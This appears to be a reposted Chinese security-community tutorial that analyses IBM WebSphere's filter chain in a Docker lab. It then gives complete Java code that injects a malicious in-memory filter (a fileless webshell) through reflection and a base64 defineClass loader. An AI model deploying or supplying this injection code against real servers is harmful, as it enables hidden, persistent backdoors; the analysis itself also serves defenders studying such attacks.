<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/12278)

> 先知社区，先知安全技术社区

目录
--

*   [环境部署](#环境部署)
*   [分析 Filter](#分析Filter)
*   [编写内存马](#编写内存马)
    *   [1、获取到 WebAppFilterManager 对象](#1获取到WebAppFilterManager对象)
    *   [2、实例化恶意 Filter 相关的 FilterChainContents......](#2实例化恶意Filter相关的FilterChainContents)
    *   [3、实例化恶意 Filter 相关的 FilterInstanceWrapper......](#3实例化恶意Filter相关的FilterInstanceWrapper)
    *   [4、完整代码](#4完整代码)
*   [后话](#后话)

环境部署
----

docker 部署环境

```
docker pull ibmcom/websphere-traditional

docker run --name websphere -h websphere -e UPDATE_HOME=true -p 9043:9043  -p 9443:9443 -p 7777:7777 --restart=always -d ibmcom/websphere-traditional

docker exec -it websphere cat /tmp/PASSWORD

9043端口

9443端口

7777端口

/tmp/PASSWORD:控制台登录密码，账号:wsadmin

登录后台: https://ip:9043/ibm/console


```

进入后台  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205304-aa1cd3c8-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205304-aa1cd3c8-c00b-1.png)

设置 websphere 为 Debug 模式  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205321-b3c1ac3c-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205321-b3c1ac3c-c00b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205402-cc603ee8-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205402-cc603ee8-c00b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205424-d989f7a8-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205424-d989f7a8-c00b-1.png)

绑定端口  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205437-e15f4046-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205437-e15f4046-c00b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205455-ec26495c-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205455-ec26495c-c00b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205508-f405b130-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205508-f405b130-c00b-1.png)

编写 DemoFilter 和 DemoServlet，配置项目的 web.xml  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205523-fc8a667a-c00b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205523-fc8a667a-c00b-1.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <filter>
        <filter-name>TestFilter</filter-name>
        <filter-class>TestFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>TestFilter</filter-name>
        <url-pattern>/test</url-pattern>
    </filter-mapping>

    <servlet>
        <servlet-name>TestServlet</servlet-name>
        <servlet-class>TestServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>TestServlet</servlet-name>
        <url-pattern>/test</url-pattern>
    </servlet-mapping>
</web-app>


```

生成 war 包  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205546-0a7df47c-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205546-0a7df47c-c00c-1.png)

将 war 包导入服务器中  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205604-15315440-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205604-15315440-c00c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205623-20abd138-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205623-20abd138-c00c-1.png)

分析 Filter
---------

在 Servlet 中打下断点，观察调用栈，通过调用栈观察是哪里调用了 TestFilter.  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205638-293656f2-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205638-293656f2-c00c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205654-3318ce0c-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205654-3318ce0c-c00c-1.png)

`com.ibm.ws.webcontainer.filter.FilterInstanceWrapper`中调用了 TestFilter  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205729-47849b8c-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205729-47849b8c-c00c-1.png)

而`this._filterInstance`是构造方法`FilterInstanceWrapper`传入的参数获取的。那么观察哪里实例化了一个`FilterInstanceWrapper`对象。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205837-705ffbaa-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205837-705ffbaa-c00c-1.png)

继续观察调用栈，可以看到在`com.ibm.ws.webcontainer.filter.WebAppFilterChain`中通过`(FilterInstanceWrapper)this._filters.get(this._currentFilterIndex)`实例化`FilterInstanceWrapper`，那么继续观察`this._filters`是如何生成的。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205856-7bab4820-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205856-7bab4820-c00c-1.png)

在`com.ibm.ws.webcontainer.filter.WebAppFilterChain`中看到`_filters为new ArrayList()`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205921-8a79b4ea-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205921-8a79b4ea-c00c-1.png)

并且在`com.ibm.ws.webcontainer.filter.WebAppFilterChain`中看到`addFilter`方法，该方法中调用了`this._filters.add(fiw)`，其中`fiw为FilterInstanceWrapper类型`在这个地方打下断点，重新调试，观察哪里调用了该方法，了解是怎么生成`WebAppFilterChain._filters`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311205940-95fee114-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311205940-95fee114-c00c-1.png)

在`com.ibm.ws.webcontainer.filter.WebAppFilterManager`中的`getFilterChain()`方法，调用了`WebAppFilterChain`的`addFilter`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210003-a387f5be-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210003-a387f5be-c00c-1.png)

关注该方法中的以下代码。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210023-afb60038-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210023-afb60038-c00c-1.png)

```
newChain.addFilter(this.getFilterInstanceWrapper((String)filterNames.get(i)));


```

其中`this.getFilterInstanceWrapper((String)filterNames.get(i))`。

这里有两个需要关注的地方，`this.getFilterInstanceWrapper()`和`(String)filterNames.get(i)`。

首先是`(String)filterNames.get(i)`。可以看到其实`filternames`实际上来自于`this.getFilterChainContents`  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210043-bb3ca9ca-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210043-bb3ca9ca-c00c-1.png)

跟进`getFilterChainContents`观察，可以看到`fcc`来自于`com.ibm.ws.webcontainer.filter.WebAppFilterManager`对象中的`chainCache变量`  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210059-c51344b8-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210059-c51344b8-c00c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210137-db8a680c-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210137-db8a680c-c00c-1.png)

接着是`this.getFilterInstanceWrapper()`，这里就是`com.ibm.ws.webcontainer.filter.WebAppFilterManager::getFilterInstanceWrapper()`

通过`filtername`来获取当前`WebAppFilterManager对象`中的`FilterInstanceWrapper对象`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210155-e6758c2e-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210155-e6758c2e-c00c-1.png)

构造内存马的思路：

1、获取到`WebAppFilterManager`对象

2、实例化恶意 Filter 相关的 FilterChainContents，添加到`WebAppFilterManager.chainCache`

3、实例化恶意 Filter 相关的 FilterInstanceWrapper，添加到`WebAppFilterManager._filterWrappers`

编写内存马
-----

### 1、获取到`WebAppFilterManager`对象

在当前线程中寻找上下文。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210215-f20276ec-c00c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210215-f20276ec-c00c-1.png)

从当前线程中获取`currentThreadsIExtendedRequest`，通过调用`getServletContext()`，获取上下文。在上下文中可以获取到当前线程的`WebAppFilterManager`对象`filterManager`。

```
private static WebAppImpl context;

    private static synchronized void GetWebContent() throws Exception{
        try {
            Object[] wsThreadLocals = (Object[]) GetField(Thread.currentThread(),"wsThreadLocals");
            for (int i = 0; i < wsThreadLocals.length; i++) {
                if(wsThreadLocals[i] != null &&wsThreadLocals[i].getClass().getName().contains("WebContainerRequestState") ){
                    currentThreadsIExtendedRequest = (SRTServletRequest) GetField(wsThreadLocals[i],"currentThreadsIExtendedRequest");
                }
            }
            ServletContext servletContext = currentThreadsIExtendedRequest.getServletContext();
            System.out.println("Step 1");

            context = (WebAppImpl)GetField(servletContext,"context");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized Object GetField(Object o, String k) throws Exception{
        Field f;
        try {
            f = o.getClass().getDeclaredField(k);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
        }
        f.setAccessible(true);
        return f.get(o);
    }


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210257-0b580774-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210257-0b580774-c00d-1.png)

接着从 web 上下文中获取到`filterManager`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210324-1b2a380c-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210324-1b2a380c-c00d-1.png)

```
private static synchronized void InjectFilter() throws Exception {
        try {
            if(context!=null){
                filterManager = (WebAppFilterManagerImpl) GetField(context,"filterManager");
                ....


```

### 2、实例化恶意 Filter 相关的 FilterChainContents......

从 filterManager 中获取到当前线程的`chainCache`，通过反射实例化一个 FilterChainContents，对照 TestFilter 的 FilterChainContents，去构造`恶意Filter相关的FilterChainContents`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210703-9ddc0af0-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210703-9ddc0af0-c00d-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210726-abc17c22-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210726-abc17c22-c00d-1.png)

```
private static synchronized void InjectFilter() throws Exception {
        try {
            if(context!=null){
                filterManager = (WebAppFilterManagerImpl) GetField(context,"filterManager");

                chainCache = (Map<String, Object>) GetField(filterManager,"chainCache");
                Constructor constructor = Class.forName("com.ibm.ws.webcontainer.filter.FilterChainContents").getDeclaredConstructor();
                constructor.setAccessible(true);
                Object filterChainContents = constructor.newInstance();

                //Step1
                ArrayList _filterNames= (ArrayList) GetField(filterChainContents,"_filterNames");
                _filterNames.add(filterName);
                SetField(filterChainContents,"_hasFilters",true);
                chainCache.put(url,filterChainContents);


```

### 3、实例化恶意 Filter 相关的 FilterInstanceWrapper......

对照 TestFilter 的 FilterInstanceWrapper，构造`恶意Filter相关的FilterInstanceWrapper`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210636-8dee5f30-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210636-8dee5f30-c00d-1.png)

从当前 filterManager 对象中获取到`_filterWrappers`，直接通过`New FilterInstanceWrapper()`实例化一个新的`FilterInstanceWrapper`。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210616-81b0b7d6-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210616-81b0b7d6-c00d-1.png)

这里有几个我认为需要注意的地方。

1、实例化 FilterInstanceWrapper 时，需要传入的参数为`ManagedObject<Filter>类型`  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210537-6ab5a672-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210537-6ab5a672-c00d-1.png)

而在早版本的 websphere 中是 filter 类型的参数  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210517-5eb22986-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210517-5eb22986-c00d-1.png)

所以这里需要进行一个类型转换。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210437-46a7f21c-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210437-46a7f21c-c00d-1.png)

2、_filtersDefined 设置为 true 的原因是因为这里对_filtersDefined 进行判断。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210404-336cd5be-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210404-336cd5be-c00d-1.png)

3、_filterState 设置为 2 的原因是因为这里对`_filterState==2`进行校验了  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20230311210348-2966c624-c00d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230311210348-2966c624-c00d-1.png)

### 4、完整代码

为了方便调试，直接在 Sevlet 的 Get 请求中编写内存马加载过程。

```
import com.ibm.ws.managedobject.ManagedObject;
import com.ibm.ws.managedobject.ManagedObjectContext;
import com.ibm.ws.webcontainer.cdi.WCManagedObject;
import com.ibm.ws.webcontainer.filter.FilterConfig;
import com.ibm.ws.webcontainer.filter.FilterInstanceWrapper;
import com.ibm.ws.webcontainer.filter.WebAppFilterManagerImpl;
import com.ibm.ws.webcontainer.srt.SRTServletRequest;
import com.ibm.ws.webcontainer.webapp.WebAppEventSource;
import com.ibm.ws.webcontainer.webapp.WebAppImpl;
import com.ibm.wsspi.webcontainer.webapp.WebAppConfig;

import sun.misc.BASE64Decoder;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class TestServlet extends HttpServlet {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    private static String filterName = "HFilter";
    private static String filterClassName = "com.sso.HFilter";
    private static String url = "/ccc";
    private static SRTServletRequest currentThreadsIExtendedRequest = null;
    private static WebAppImpl context;
    private static WebAppFilterManagerImpl filterManager= null;
    private static Map<String, Object> chainCache = null;
    private static Hashtable<String, FilterInstanceWrapper> _filterWrappers;



    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.getWriter().println("This is Http");
        try {
            LoadFilter();
            GetWebContent();
            InjectFilter();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static synchronized void LoadFilter() throws Exception {
        try{
            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
        }catch (Exception e){
            Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            a.setAccessible(true);
            byte[] b = (new BASE64Decoder()).decodeBuffer("恶意Filter.class | base64");
            a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
        }
    }

    private static synchronized void GetWebContent() throws Exception{
        try {
            Object[] wsThreadLocals = (Object[]) GetField(Thread.currentThread(),"wsThreadLocals");
            for (int i = 0; i < wsThreadLocals.length; i++) {
                if(wsThreadLocals[i] != null &&wsThreadLocals[i].getClass().getName().contains("WebContainerRequestState") ){
                    currentThreadsIExtendedRequest = (SRTServletRequest) GetField(wsThreadLocals[i],"currentThreadsIExtendedRequest");
                }
            }
            ServletContext servletContext = currentThreadsIExtendedRequest.getServletContext();
            System.out.println("Step 1");

            context = (WebAppImpl)GetField(servletContext,"context");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized Object GetField(Object o, String k) throws Exception{
        Field f;
        try {
            f = o.getClass().getDeclaredField(k);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
        }
        f.setAccessible(true);
        return f.get(o);
    }


    public TestServlet() {
    }

    private static synchronized void InjectFilter() throws Exception {
        try {
            if(context!=null){
                filterManager = (WebAppFilterManagerImpl) GetField(context,"filterManager");

                chainCache = (Map<String, Object>) GetField(filterManager,"chainCache");
                Constructor constructor = Class.forName("com.ibm.ws.webcontainer.filter.FilterChainContents").getDeclaredConstructor();
                constructor.setAccessible(true);
                Object filterChainContents = constructor.newInstance();

                //Step1
                ArrayList _filterNames= (ArrayList) GetField(filterChainContents,"_filterNames");
                _filterNames.add(filterName);
                SetField(filterChainContents,"_hasFilters",true);
                chainCache.put(url,filterChainContents);

                //Step2
                _filterWrappers = (Hashtable<String, FilterInstanceWrapper>) GetField(filterManager,"_filterWrappers");
                javax.servlet.Filter filter =  (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
                WebAppEventSource _evtSource = (WebAppEventSource) GetField(filterManager,"_evtSource");

                ManagedObject filterMo = context.createManagedObject(filter);
                FilterInstanceWrapper filterInstanceWrapper = new FilterInstanceWrapper(filterName,filterMo,_evtSource);

                SetField(filterInstanceWrapper,"_filterState",2);

                Object webAppConfig = GetField(filterManager,"webAppConfig");
                FilterConfig filterConfig = new FilterConfig(filterName,(WebAppConfig) webAppConfig);

                HashSet<DispatcherType> set = new HashSet();
                set.add(DispatcherType.REQUEST);
                filterConfig.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST),true,url);

                SetField(filterInstanceWrapper,"_filterConfig",filterConfig);

                _filterWrappers.put(filterName,filterInstanceWrapper);

                SetField(filterManager,"_filtersDefined",true);
                System.out.println("123");

            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized void SetField(Object o, String k,Object v) throws Exception{
        Field f;
        try{
            f = o.getClass().getDeclaredField(k);
        }catch (NoSuchFieldException e){
            f = o.getClass().getSuperclass().getDeclaredField(k);
        }catch (Exception e1){
            f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
        }
        f.setAccessible(true);
        f.set(o,v);
    }



    @Override
    public void destroy() {

    }


}


```

后话
--

如分析有不对之处，望斧正~~